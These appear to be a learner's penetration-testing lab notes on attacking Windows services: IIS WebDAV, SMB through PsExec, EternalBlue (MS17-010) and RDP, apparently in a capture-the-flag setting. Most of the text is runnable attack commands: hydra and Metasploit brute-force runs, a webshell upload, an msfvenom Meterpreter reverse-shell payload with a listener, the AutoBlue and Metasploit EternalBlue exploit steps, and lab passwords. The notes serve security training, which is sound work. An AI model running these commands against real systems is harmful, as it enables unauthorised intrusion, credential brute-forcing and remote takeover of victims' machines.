# Exploiting Microsoft IIS WebDAV

## Overview

This section details the process of exploiting a Microsoft IIS WebDAV server. It includes basic information about IIS and WebDAV, steps for identifying and exploiting WebDAV vulnerabilities, and a list of tools used in the process.

## Microsoft IIS

- **IIS (Internet Information Services)**: Proprietary web server software developed by Microsoft for the Windows NT family.
- **Usage**: Hosting websites and web applications with a robust GUI for managing them.
- **Supported File Types**: .asp, .aspx, .config, .php.
- **Ports**: Typically runs on port 80 (HTTP) or 443 (HTTPS with SSL certificate).

## WebDAV

- **WebDAV (Web-based Distributed Authoring and Versioning)**: Extensions to the HTTP protocol allowing collaborative file management on remote web servers.
- **Functionality**: Enables a web server to act as a file server.
- **Ports**: Operates on the same ports as IIS (80/443).
- **Authentication**: Requires legitimate credentials (username and password).

## WebDAV Exploitation

1. **Identification**: Determine if WebDAV is configured on the IIS server.
2. **Brute-force Attack**: Identify legitimate credentials for authentication.
3. **Exploitation**: Authenticate with the server and upload a malicious payload (e.g., .asp file) to execute commands or obtain a reverse shell.

## Tools

- **davtest**: Scans, authenticates, and exploits WebDAV servers. Pre-installed on offensive testing distros like Kali and Parrot.
- **cadaver**: Supports file operations (upload, download, delete) and resource locking on WebDAV servers. Also pre-installed on offensive testing distros.

## Credentials

| Username | Password         |
|----------|------------------|
| bob      | password_123321  |

## Basic Scans

1. **Initial Scan**: Identify open ports and services.

nmap -sV -sC 10.2.23.231

2. **Service Enumeration**: Identify directories and services on port 80.

`nmap -sV -p 80 --script=http-enum 10.2.23.231`
`Reveals the presence of the WebDAV directory.`

### Brute Force Authentication

`hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.23.231 http-get /webdav/`
Perform a brute-force attack on the WebDAV authentication form:

### Running davtest

1. **Without Authentication**:

davtest -url http://10.2.23.231/webdav
- Fails due to lack of authentication.

2. **With Authentication**:

davtest -auth bob
`-url http://10.2.23.231/webdav`
- Enumerates executable file formats and uploads to the /webdav directory.

### Uploading a .asp Backdoor

`cadaver http://10.2.23.231/webdav`
using cadaver

`put /usr/share/webshells/asp/webshell.asp`
Upload backdoor

3. **List directory**:

`ls`
- Confirms the upload of the backdoor.

### Exploiting the Backdoor

1. **Access Webshell**:
- Open the browser and navigate to `http://10.2.23.231/webdav/webshell.asp`.
2. **Execute Commands**:
- Example commands to list directory and view a file:

  `dir C:\`
  `type c:\flag.txt`

# Exploiting WebDAV with Metasploit

## Objective

In this section, we will exploit a WebDAV server running on IIS using Metasploit. The goal is to upload a malicious payload to the WebDAV directory and gain remote access to the target system. We'll cover the following steps:

1. **Credentials**: Accessing the WebDAV server with known credentials.
2. **Basic Scans**: Identifying the WebDAV service and configuring it.
3. **Obtaining a Reverse Shell**: Generating and uploading a payload using Metasploit.
4. **Alternative Method**: Using Metasploit's exploit modules for WebDAV.

## Credentials

| Username | Password         |
|----------|------------------|
| bob      | password_123321  |

## Basic Scans

1. **Identify WebDAV Directory**  
   `nmap -sV -p 80 --script=http-enum [target IP]`  
   This command scans for HTTP services on port 80 and enumerates available directories. It confirms that WebDAV is running on the IIS server.

2. **Access WebDAV Directory**  
   Access the WebDAV directory via a web browser to check if it is properly configured.

## Obtaining a Reverse Shell

### Generate Payload

1. **Create a Reverse Shell Payload**  
   `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[eth1, own IP] LPORT=1234 -f asp > shell.asp`  
   `msfvenom` generates a Meterpreter reverse shell payload in ASP format. Replace `[eth1, own IP]` with your local IP address.

2. **List Files**  
   `ls`  
   Verify the generated payload file.

### Upload Payload Using Cadaver

1. **Upload Payload**  
   `cadaver http://[target IP]/webdav`  
   `put /root/shell.asp`  
   Upload the generated `shell.asp` to the WebDAV directory.

2. **List Files Again**  
   `ls`  
   Confirm the successful upload of the payload.

### Configure Metasploit Listener

1. **Start Metasploit Console**  
   `msfconsole`  
   Initialize Metasploit Framework.

2. **Setup Multi/Handler**  
   `msf6: service postgresql start && msfconsole`  
   Start PostgreSQL and Metasploit Console.

   `msf6: use multi/handler`  
   Select the multi/handler module for managing incoming connections.

   `msf6: set payload windows/meterpreter/reverse_tcp`  
   Set the payload type to reverse TCP Meterpreter.

   `msf6: show options`  
   Display available options for the selected payload.

   `msf6: set LHOST [eth1]`  
   Set your local IP address for the listener.

   `msf6: set LPORT 1234`  
   Set the port for the listener.

   `msf6: run`  
   Start the listener. When payload executes on target, it will connect back to this paticular tcp handler

3. **Execute Payload**  
   Navigate to the uploaded `shell.asp` file in a browser to execute it. This should establish a connection to your Metasploit listener. Now we get access to the target machine.

4. **Verify Access**  
   - `meterpreter > sysinfo`  
   - `meterpreter > getuid`  
   - `exit`: Terminates the current Meterpreter session.

5. **List Active Sessions**  
   - `sessions`  
   Check for active sessions and manage them as needed.

## Another Method

1. **Search for IIS Upload Exploit**  
   `msf6: search iis upload`  
   Look for available exploits related to IIS upload functionality.

2. **Use IIS WebDAV Upload Exploit**  
   `msf6: use exploit/windows/iis/iis_webdav_upload_asp`  
   Select the appropriate exploit module.

   `msf6: show options`  
   Review the options for the exploit module.

3. **Configure Exploit Settings**  
   - `msf6: set Httpusername bob`  
   - `msf6: set httpPassword password_123321`  
   - `msf6: set rhosts [target IP`  
   - `msf6: set rport 443 if target has SSL cert`  
   - `msf6: set PATH /webdav/metasploit.asp`  

   Set the necessary parameters for the exploit.

4. **Run Exploit**  
   `msf6: exploit`  
   Execute the exploit to gain remote access.

5. **Verify Access**  
   - `meterpreter > sysinfo`  
   - `meterpreter > getuid`  

   Confirm successful exploitation and access to the target system.

6. **Get the flag**
   `cd`
   `dir`
   `type flag.txt`

# Exploiting SMB with PsExec

- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files peripherals (printers and serial ports) between computer on a local network (LAN)
- SMB uses port 445 (tcp). However, originally, SMB ran on top of NetBIOS using port 139.
- Samba is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.

## SMB Authentification
- SMB protocol utilizes two levels of authentication:
  - User Authentication
  - Share Authentication
 
- User authentication - Users must provide a username and password in order to authenicate with the SMB server in order to access a share.
- Share authentication - Users must provide a password in order to access restricted share

## PsExec
- Lightweight telnet-replacement developed by Microsoft that allows us to execute processes on remote windows systems using any user's credentials
- PsExec authentication is performed via SMB
- We can use the PsExec utility to authenticate with the target system legitimaly and run arbitrary commands or launch a remote command prompt.
- It is very similar to RDP, however, instead of controlling the rmeote system via GUI, commands are sent via CMD
- In order to gain access to a Windows target, we need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by using various tools and techniques. Most common technique will involve performing an SMB login brute-force attack.
- We can narrow down our brute-force attack to only include common windows user accounts like: Administrator
- After we have optained a legitimate user account and password, we cn use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.

# Demo: Exploiting SMB with PsExec

### 1. Basic Scans:

`nmap -sV -sC  [target IP]`

## 2. SMB Brute-force Attack

To perform an SMB brute-force attack, we'll use the Metasploit Framework. This involves trying different combinations of usernames and passwords to find valid credentials.

1. **Start Metasploit**: Begin by starting the PostgreSQL service (required by Metasploit) and launching the Metasploit console.

    `service postgresql start && msfconsole`

2. **Search for the SMB Login Module**: Locate the `smb_login` module, which is used to perform SMB brute-force attacks.

    `search smb_login`

3. **Load the SMB Login Module**: After finding the module, load it into the Metasploit console.

    `use auxiliary/scanner/smb/smb_login`

4. **Configure the Module**: Set up the necessary parameters for the brute-force attack:

    - Set the target IP address:

      `set RHOSTS [target IP]`

    - Specify the username file:

      `set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

    - Specify the password file:

      `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`

    - Disable verbose output:

      `set verbose false`

5. **Run the Brute-force Attack**: Execute the brute-force attack to discover valid credentials.

    `run`

## 3. Using PsExec for Remote Command Execution

Once valid credentials are obtained, use PsExec to execute commands on the target system. There are two methods to achieve this: using the Python implementation of PsExec or using the PsExec module in Metasploit.

### Method 1: PsExec with Python Implementation

1. **Authenticate with the Target**: Use the Python PsExec tool to authenticate as the Administrator on the target and start a command prompt.

    `psexec.py Administrator@[target IP] cmd.exe`

2. **Verify Access**: Run a command to confirm that you have gained access to the target system.

    `whoami`

### Method 2: PsExec via Metasploit

1. **Load the PsExec Module**: Use Metasploit's `psexec` module to gain access to the target via SMB.

    `use exploit/windows/smb/psexec`

2. **Configure the Module**: Set the necessary options for the PsExec attack:

    - Set the target IP address:

      `set rhosts [target IP]`

    - Specify the SMB username:

      `set smbuser Administrator`

    - Specify the SMB password:

      `set SMBPass qwertyiop`

3. **Execute the Exploit**: Run the exploit to gain access to the target system.

    `exploit`

4. **Verify Access**: After successful exploitation, check the system information and user ID to confirm access.

    `sysinfo`
    
    `getuid`

## 4. Retrieving the Flag

Once you have established a connection to the target system, you can navigate the filesystem and retrieve the flag (typically used in Capture the Flag (CTF) challenges).

1. **Open a Shell**: Launch a command shell on the target system.

    `shell`

2. **Navigate to the Root Directory**: Change the directory to the root to explore the file structure.

    `cd /`

3. **List Files in the Directory**: Display the contents of the current directory to locate the flag file.

    `dir`

4. **Read the Flag File**: Display the contents of the flag file.

    `type flag.txt`

# Exploiting Windows MS

## MS17-10 EternalBlue Exploit
- EternalBlue (MS17-010/CVE-2017-0144) is a collection of Wndows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.

## Tools & Environment:
- AutoBlue-MS17-010
- Windows Server 2008 R2
- Pentesting distribution: Kali Linux

## Demo

## Basic Scans

`sudo nmap -sV -p 445 -O [target IP]`
**Port 445, SMB is running. Windows Server 2008 R2**

**finding out if target is vulnerable to AutoBlue MS17. This exploit will only work with systems with SMBv1**
`sudo nmap -sV -p 445 --script=smb-vuln-ms17-010 [target IP]`

**SMB is enabled and running on target. So its vulnerable**

**Running exploit manually via GitHub:**
- Copy repository
- Create folder EternalBlue
- Copy it in this folder
- `ls`
- Create shellcode which is going to be exploited on target system
- `cd Shellcode`
- `chmod +x shell_prep.sh`
- `shell_prep.sh`
- `Y`: Because we are utilising a cmd shell payload
- `set lhosts [own IP]`
- `set lport [1234]`
- `1`: generate regular cmd shell
- `1`: stageless payload
- `ls`: list content in shellcode directory. we use sc_x64.bin or sc_x86.bin
- `nc -nvlp 1234`
we begin the acutal exploitation:
- `cd ..`: We are in the shellcode directory, we want to go back into Desktop/EternalBlue/Auto-Blue-MS171-010
- `chmod+x eternalblue_exploit7.py`: we provide this python file with executable permission. `ls` and its highlighted in green = executable
- `python eternalblue_exploit7.py [target IP] shellcode/sc_x64.bin`: On netcat listener we should get a cmd shell
- on netcat window, we can run `whoami`, we got successfully access

** Running exploit automatically:***

`msfconsole`
  `search eternalblue`
  auxiliary module will tell us target system is vulnerable.
  exploit module will provide us with a remote code execution.
  msf6: `use exploit/windows/smb/ms17_010_eternalblue`
  msf6: `show options`
  msf6: `set rhosts [target IP]`
  msf6: `exploit`
Gives us information about the vulnerability and the meterpreter connection should be successfully.

# Exploiting RDP
- RDP is a GUI remote access protocol and is used to remotely connect and interact with a Windows system.
- RDP used TCP port 3389 by default, but can also be configured to run on any other TCP port.
- RDP
- RDP authentification requires user account and password.
- We can perform an RDP brute-force attack to identify user credentials that we can use to gain access to the target system.

## Demo

`nmap -sV [target IP]`

We don't see port 3389 open, so it runs on another port. So we need to check on which port RDP runs:
`service postgresql start && msfconsole`
  msf5: search rdp_scanner
  msf5: use auxiliary/scanner/rdp/rdp_scanner
  msf5: show options
  msf5: set rhosts [target IP]
  msf5: set rport [port configured for rdp]
  msf5: run

**We need to get credentials for RDP via brute-force**
`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://[target IP] -s 3333` (with -t the speed of the brute-force can be specified. this could prevent blocking and tracking)

**Authenticate with the target via RDP using xFreeRDP**
`xfreerdp /u:administrator /p:qwertyuiop /v:[targetIP]:3333`
